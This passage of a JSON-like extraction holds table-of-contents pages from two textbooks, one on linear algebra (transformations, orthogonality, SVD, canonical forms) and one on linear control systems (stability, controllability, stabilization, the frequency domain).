ExercisesforChapter6 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 373\n7 Linear Transformations 375\n7.1 Examplesand ElementaryProperties . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 375\n7.2 Kerneland ImageofaLinearTransformation . . . . . . . . . . . . . . . . . . . . . . . . 382\n7.3 Isomorphismsand Composition . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 392\n7.4 ATheorem aboutDifferentialEquations . . . . . . . . . . . . . . . . . . . . . . . . . . . 402\n7.5 Moreon LinearRecurrences . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 405\n8 Orthogonality 415\n8.1 OrthogonalComplementsandProjections . . . . . . . . . . . . . . . . . . . . . . . . . . 415\n8.2 OrthogonalDiagonalization. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 424\n8.3 PositiveDefiniteMatrices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 433\n8.4 QR-Factorization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 437\n8.5 ComputingEigenvalues . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 441",
    "Page_11": "CONTENTS v\n8.6 TheSingularValueDecomposition . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 445\n8.6.1 SingularValueDecompositions . . . . . . . . . . . . . . . . . . . . . . . . . . . 446\n8.6.2 Fundamental Subspaces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 452\n8.6.3 ThePolarDecompositionofaReal SquareMatrix . . . . . . . . . . . . . . . . . 455\n8.6.4 ThePseudoinverseofaMatrix . . . . . . . . . . . . . . . . . . . . . . . . . . . . 457\n8.7 ComplexMatrices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 461\n8.8 AnApplicationtoLinearCodes overFiniteFields . . . . . . . . . . . . . . . . . . . . . . 472\n8.9 AnApplicationtoQuadraticForms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 487\n8.10 AnApplicationtoConstrainedOptimization . . . . . . . . . . . . . . . . . . . . . . . . . 497\n8.11 AnApplicationtoStatisticalPrincipal ComponentAnalysis . . . . . . . . . . . . . . . . . 500\n9 Change ofBasis 503\n9.1 TheMatrixofa LinearTransformation . . . . . . . . . . . . . . . . . . . . . . . . . . . . 503\n9.2 Operatorsand Similarity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 512\n9.3 InvariantSubspaces andDirect Sums . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 522\n10 Inner Product Spaces 537\n10.1 InnerProductsand Norms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 537\n10.2 OrthogonalSets ofVectors . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 547\n10.3 OrthogonalDiagonalization. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 557\n10.4 Isometries . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 564\n10.5 AnApplicationtoFourierApproximation . . . . . . . . . . . . . . . . . . . . . . . . . . 577\n11 Canonical Forms 583\n11.1 BlockTriangularForm . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 583\n11.2 TheJordan Canonical Form . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 591\nA Complex Numbers 597\nB Proofs 611\nC Mathematical Induction 617\nD Polynomials 623\nSelected Exercise Answers 627\nIndex 665\nwww.dbooks.org",
    "Page_12": ""
}

{
    "Page_10": "Contents\n1 Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1\n1.1 The Abstract Notion of System . . . . . . . . . . . . . . . . . . . . . . . . . 1\n1.1.1 The Input-Output Operator. . . . . . . . . . . . . . . . . . . . . . . 1\n1.1.2 Discrete Time and Continuous Time. . . . . . . . . . . . . . . . 3\n1.1.3 Input Space and Output Space . . . . . . . . . . . . . . . . . . . . 3\n1.1.4 State Space . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3\n1.1.5 Finite Dimensional Systems . . . . . . . . . . . . . . . . . . . . . . 4\n1.1.6 Connection of Systems. . . . . . . . . . . . . . . . . . . . . . . . . . 4\n1.1.7 System Analysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5\n1.1.8 Control System Design . . . . . . . . . . . . . . . . . . . . . . . . . 6\n1.1.9 Properties of Systems. . . . . . . . . . . . . . . . . . . . . . . . . . . 7\n1.2 Impulse Response Systems . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8\n1.3 Initial Conditions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12\n1.3.1 Deterministic Systems . . . . . . . . . . . . . . . . . . . . . . . . . . 13\n1.3.2 Time Invariant Systems . . . . . . . . . . . . . . . . . . . . . . . . . 14\n1.3.3 Linear Systems . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14\n1.3.4 External Stability. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 15\n1.3.5 Zero-Initialized Systems and Unforced Systems. . . . . . . . 15\n1.4 Differential Systems . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\n1.4.1 Admissible Inputs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\n1.4.2 State Equations . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\n1.4.3 Linear Differential Systems. . . . . . . . . . . . . . . . . . . . . . . 18\n2 Unforced Linear Systems . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21\n2.1 Prerequisites. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21\n2.2 The Exponential Matrix . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23\n2.3 The Diagonal Case . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25\n2.4 The Nilpotent Case. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25\n2.5 The Block Diagonal Case . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\n2.6 Linear Equivalence. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28\nxi",
    "Page_11": "xii Contents\n2.7 The Diagonalizable Case. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29\n2.8 Jordan Form. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 30\n2.9 Asymptotic Estimation of the Solutions . . . . . . . . . . . . . . . . . . . 33\n2.10 The Scalar Equation of Order n. . . . . . . . . . . . . . . . . . . . . . . . . 34\n2.11 The Companion Matrix. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 39\n3 Stability of Unforced Linear Systems . . . . . . . . . . . . . . . . . . . . . . . . 43\n3.1 Equilibrium Positions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43\n3.2 Conditions for Stability. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 44\n3.3 Lyapunov Matrix Equation . . . . . . . . . . . . . . . . . . . . . . . . . . . . 46\n3.4 Routh-Hurwitz Criterion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 50\n4 Linear Systems with Forcing Term. . . . . . . . . . . . . . . . . . . . . . . . . . 53\n4.1 Nonhomogeneous Systems . . . . . . . . . . . . . . . . . . . . . . . . . . . . 53\n4.1.1 The Variation of Constants Method . . . . . . . . . . . . . . . . 54\n4.1.2 The Method of Undetermined Coefficients . . . . . . . . . . . 55\n4.2 Transient and Steady State . . . . . . . . . . . . . . . . . . . . . . . . . . . . 57\n4.3 The Nonhomogeneous Scalar Equation of Order n . . . . . . . . . . . 59\n4.4 The Laplace Transform Method. . . . . . . . . . . . . . . . . . . . . . . . . 62\n4.4.1 Transfer Function. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 62\n4.4.2 Frequency Response Analysis. . . . . . . . . . . . . . . . . . . . . 66\n5 Controllability and Observability of Linear Systems . . . . . . . . . . . . 69\n5.1 The Reachable Sets. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 69\n5.1.1 Structure of the Reachable Sets . . . . . . . . . . . . . . . . . . . 72\n5.1.2 The Input-Output Map . . . . . . . . . . . . . . . . . . . . . . . . . . 73\n5.1.3 Solution of the Reachability Problem . . . . . . . . . . . . . . . 73\n5.1.4 The Controllability Matrix . . . . . . . . . . . . . . . . . . . . . . . 75\n5.1.5 Hautus\u2019 Criterion. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 78\n5.2 Observability . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 80\n5.2.1 The Unobservability Space. . . . . . . . . . . . . . . . . . . . . . . 81\n5.2.2 The Observability Matrix . . . . . . . . . . . . . . . . . . . . . . . . 82\n5.2.3 Reconstruction of the Initial State. . . . . . . . . . . . . . . . . . 84\n5.2.4 Duality . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 85\n5.3 Canonical Decompositions . . . . . . . . . . . . . . . . . . . . . . . . . . . . 85\n5.3.1 Linear Equivalence . . . . . . . . . . . . . . . . . . . . . . . . . . . . 86\n5.3.2 Controlled Invariance. . . . . . . . . . . . . . . . . . . . . . . . . . . 86\n5.3.3 Controllability Form. . . . . . . . . . . . . . . . . . . . . . . . . . . . 87\n5.3.4 Observability Form . . . . . . . . . . . . . . . . . . . . . . . . . . . . 88\n5.3.5 Kalman Decomposition . . . . . . . . . . . . . . . . . . . . . . . . . 90\n5.3.6 Some Examples. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 91\n5.4 Constrained Controllability . . . . . . . . . . . . . . . . . . . . . . . . . . . . 93\nwww.dbooks.org",
    "Page_12": "Contents xiii\n6 External Stability . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 97\n6.1 Definitions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 98\n6.2 Internal Stability. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 102\n6.3 The Case C \u00bcI . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 102\n6.4 The General Case. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 105\n7 Stabilization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 111\n7.1 Static State Feedback . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 111\n7.1.1 Controllability . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 112\n7.1.2 Stability . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 114\n7.1.3 Systems with Scalar Input . . . . . . . . . . . . . . . . . . . . . . . 114\n7.1.4 Stabilizability. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 120\n7.1.5 Asymptotic Controllability . . . . . . . . . . . . . . . . . . . . . . . 122\n7.2 Static Output Feedback. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 123\n7.2.1 Reduction of Dimension. . . . . . . . . . . . . . . . . . . . . . . . . 125\n7.2.2 Systems with Stable Zero Dynamics . . . . . . . . . . . . . . . . 128\n7.2.3 A Generalized Matrix Equation . . . . . . . . . . . . . . . . . . . 128\n7.2.4 A Necessary and Sufficient Condition. . . . . . . . . . . . . . . 130\n7.3 Dynamic Output Feedback . . . . . . . . . . . . . . . . . . . . . . . . . . . . 132\n7.3.1 Construction of an Asymptotic Observer. . . . . . . . . . . . . 133\n7.3.2 Construction of the Dynamic Stabilizer. . . . . . . . . . . . . . 134\n7.4 PID Control . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 136\n8 Frequency Domain Approach. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 139\n8.1 The Transfer Matrix . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 139\n8.2 Properties of the Transfer Matrix. . . . . . . . . . . . . . . . . . . . . . . . 142\n8.3 The Realization Problem. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 144\n8.4 SISO Systems . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 148\n8.4.1 The Realization Problem for SISO Systems. . . . . . . . . . . 148\n8.4.2 External Stability. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 151\n8.4.3 Nyquist Diagram . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 155\n8.4.4 Stabilization by Static Output Feedback . . . . . . . . . . . . . 157\n8.5 Disturbance Decoupling . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 159\nAppendix A: Internal Stability Notions.. .... .... .... .... ..... .... 165\nAppendix B: Laplace Transform... .... .... .... .... .... ..... .... 171\nIndex .... .... .... .... .... ..... .... .... .... .... .... ..... .... 187",
}